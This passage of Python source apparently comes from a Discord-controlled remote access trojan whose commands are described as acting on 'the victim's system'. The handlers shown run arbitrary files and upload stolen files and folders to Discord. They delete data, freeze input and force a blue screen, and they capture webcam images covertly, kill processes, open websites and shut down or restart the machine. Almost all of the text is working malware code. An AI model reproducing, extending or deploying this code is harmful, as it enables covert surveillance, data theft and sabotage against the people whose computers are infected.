        subprocess.Popen(file_path, shell=True)
        await ctx.send(f"File '{file_path}' has been executed.")
    except Exception as e:
        await ctx.send(f"Error: Could not execute the file. {str(e)}")    

@bot.command(help="Compresses and downloads a file or folder from victim's system", usage="$download <file/folder>")
async def download(ctx, file_path: str = None):
    try:
        if not file_path:
            await ctx.send("Error: No file path provided. Please specify the file or folder path to download.")
            return
        if not os.path.exists(file_path):
            await ctx.send(f"Error: The path '{file_path}' does not exist.")
            return
        
        tar_filename = os.path.basename(file_path) + '.tar.gz'
        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
            tar.add(file_path, arcname=os.path.basename(file_path))
        buffer.seek(0)
        await ctx.send(file=discord.File(fp=buffer, filename=tar_filename))
    except Exception as e:
        await ctx.send(f"Error: Could not compress and send the file or folder. {str(e)}")
    
@bot.command(help="Deletes a folder or file from the victim's system", usage="$delete <file>")
async def delete(ctx, path: str = None):
    if not path:
        await ctx.send("Error: No path provided. Please specify a file or folder path to delete.")
        return
    if os.path.isfile(path):
        os.remove(path)
        await ctx.send(f"File '{path}' has been deleted.")
    elif os.path.isdir(path):
        shutil.rmtree(path)
        await ctx.send(f"Folder '{path}' and all its contents have been deleted.")
    else:
        await ctx.send(f"The path '{path}' does not exist.")
        
@bot.command(help="Moves a file from one location to another on victim's system", usage="$move <file> <destination>")
async def move(ctx, source: str = None, destination: str = None):
    if not source or not destination:
        await ctx.send("Error: Please provide both source and destination paths.")
        return
    if not os.path.exists(source):
        await ctx.send(f"Error: The source path '{source}' does not exist.")
        return
    destination_dir = os.path.dirname(destination)
    if not os.path.exists(destination_dir):
        await ctx.send(f"Error: The destination directory '{destination_dir}' does not exist.")
        return
    try:
        shutil.move(source, destination)
        await ctx.send(f"'{source}' has been moved to '{destination}'.")
    except Exception as e:
        await ctx.send(f"Error: Could not move '{source}' to '{destination}'. {str(e)}")

@bot.command(help="Freezes the cursor on the victim's system.", usage="$freezecursor")
async def freezecursor(ctx):
    try:
        result = ctypes.windll.user32.BlockInput(True)
        if result == 0:
            await ctx.send("Failed to freeze cursor. Victim is not running with elevated privileges.")
        else:
            await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Unfreezes the cursor on the victim's system.", usage="$unfreezecursor")
async def unfreezecursor(ctx):
    try:
        ctypes.windll.user32.BlockInput(False)
        await ctx.send("Command Executed!")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(aliases=["bsod"], help="Attempts to trigger a blue screen on the victim's system.", usage="$bluescreen")
async def bluescreen(ctx):
    try:
        await ctx.send("Command Executed!")
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Takes a picture on the victim's webcam.", usage="$webcampic [cameraID]")
async def webcampic(ctx, cam: int = 0):
    try:
        cap = cv2.VideoCapture(cam)
        if not cap.isOpened():
            raise Exception("Could not open webcam")
        
        ret, frame = cap.read()
        cap.release()
        if not ret:
            raise Exception("Failed to grab frame from webcam")
        
        buffer = io.BytesIO()
        ret, im_encoded = cv2.imencode(".png", frame)
        if not ret:
            raise Exception("Failed to encode image")
        buffer.write(im_encoded.tobytes())
        buffer.seek(0)
        await ctx.send(f"Captured from camera {cam}!", file=discord.File(fp=buffer, filename="webcam.png"))
    except Exception as e:
        await ctx.send(f"Error executing webcam capture command: {str(e)}")

@bot.command(help="Lists all running tasks on the victim's system.", usage="$tasks")
async def tasks(ctx):
    try:
        processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
        processes.sort(key=lambda p: (p['name'] or '').lower())
        text = ""
        for proc in processes:
            if proc['name'] and proc['name'] != "":
                text += f"{proc['name']} - {proc['pid']}\n"
        buffer = io.BytesIO(text.encode('utf-8'))
        await ctx.send("List of running tasks:", file=discord.File(fp=buffer, filename="tasks.txt"))
    except Exception as e:
        await ctx.send(f"Error: Could not list tasks. {str(e)}")

@bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.", usage="$kill <taskname>")
async def kill(ctx, arg: str = ""):
    if arg == "" or not arg:
        await ctx.send("Please enter a task to be terminated")
    try:
        pid = int(arg)
        process = psutil.Process(pid)
        process.terminate() 
        await ctx.send(f"Task with PID {pid} has been terminated!")
    except ValueError:
        
        terminated = 0
        firstProcName = "None"
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower().rstrip(".exe") == arg.lower().rstrip(".exe"):
                try:
                    psutil.Process(proc.info['pid']).terminate()
                    firstProcName = proc.info['name']
                    terminated += 1
                except psutil.NoSuchProcess:
                    pass
                        
        if terminated > 0:
            await ctx.send(f"Terminated **{terminated}** processes with the name `{arg}`")
        else:
            await ctx.send(f"No processes with the name `{firstProcName}` found.")
    except Exception as e:
        await ctx.send(f"Error terminating task: {str(e)}")

@bot.command(aliases=["url"], help="Opens the given website on the victim's default browser.", usage="$website <url>")
async def website(ctx, *, url: str):
    try:
        webbrowser.open(url)
        await ctx.send(f"Opened and maximized the website: {url}")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(aliases=["gsearch"], help="Googles the given text on the victim's computer.", usage="$google <url>")
async def google(ctx, *, q: str):
    try:
        url = f"https://www.google.com/search?q=" + q.replace('"', '\\"').replace(" ", "+")
        webbrowser.open(url)
        await ctx.send(f"Googled `{q}`")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Shuts down the victim's system.", usage="$shutdown")
async def shutdown(ctx):
    try:
        os.system('shutdown /s /t 1')
        await ctx.send("Command Executed! System is shutting down.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Restarts the victim's system.", usage="$restart")
async def restart(ctx):
    try:
        os.system('shutdown /r /t 1')
        await ctx.send("Command Executed! System is restarting.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Logs off the current user on the victim's system.", usage="$logoff")
async def logoff(ctx):
    try:
        os.system('shutdown /l')
        await ctx.send("Command Executed! Logging off.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Gets description of a specific command", usage="$help <command>")
async def help(ctx, command_name: str):
    command = bot.get_command(command_name)
    if command:
        embed = discord.Embed(
            title=f"Help: {command_name}",
            description=command.help if command.help else "No description provided",
            color=0x007BFF
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"Command '{command_name}' not found.")

@bot.command(help="List bot commands in alphabetical order", usage="$commands")
async def commands(ctx, page: int = 1):
    per_page = 10
    commands_list = list(bot.commands)
    commands_list.sort(key=lambda cmd: cmd.name)

    max_page = (len(commands_list) - 1) // per_page + 1
    if page < 1 or page > max_page:
        await ctx.send(f"Page {page} is out of range. Please provide a page number between 1 and {max_page}.")
        return

    def render_page(page_num: int):
        start = (page_num - 1) * per_page
        end = start + per_page
        page_cmds = commands_list[start:end]

        embed = discord.Embed(title="Available Commands", description="List of all commands", color=0x007BFF)
        for cmd in page_cmds:
            primary = cmd.name
            aliases = list(cmd.aliases) if getattr(cmd, "aliases", None) else []
            title = ", ".join(dict.fromkeys([primary] + aliases))

            parts = []
            if getattr(cmd, "usage", None):
                parts.append(f"`{cmd.usage}`")
            if getattr(cmd, "help", None):
                parts.append(cmd.help)

            value = "\n".join(parts)
            if value:
                embed.add_field(name=title, value=value, inline=False)

        embed.set_footer(text=f"Page {page_num}/{max_page}")
        return embed

    embed = render_page(page)
    message = await ctx.send(embed=embed)

    if max_page > 1:
        await message.add_reaction("◀️")
        await message.add_reaction("▶️")

        def reaction_check(reaction, u):
            return (
                u == ctx.author
                and str(reaction.emoji) in ("◀️", "▶️")
                and reaction.message.id == message.id
            )

        while True:
            try:
                reaction, u = await bot.wait_for("reaction_add", timeout=120, check=reaction_check)
                if str(reaction.emoji) == "◀️" and page > 1:
                    page -= 1
                elif str(reaction.emoji) == "▶️" and page < max_page:
                    page += 1

                await message.edit(embed=render_page(page))
                try:
                    await message.remove_reaction(reaction.emoji, u)
                except Exception as e:
                    print(e)
            except asyncio.TimeoutError:
                break

@bot.command(help="Force stops the bot.", usage="$estop")
async def estop(ctx):
    if ctx.author.guild_permissions.administrator:
        await ctx.send("Force stopping bot...")
        await bot.close()
        os._exit(0)
    else:
        await ctx.send("You don't have permissions to do this.")

try:
    bot.run(TOKEN, reconnect=True)
except discord.errors.LoginFailure:
    exit("\n\033[91mError: Invalid bot token.\033[0m")
except KeyboardInterrupt:
    exit("\n\033[91mExiting...\033[0m")
    bot.close()
    sys.exit(0)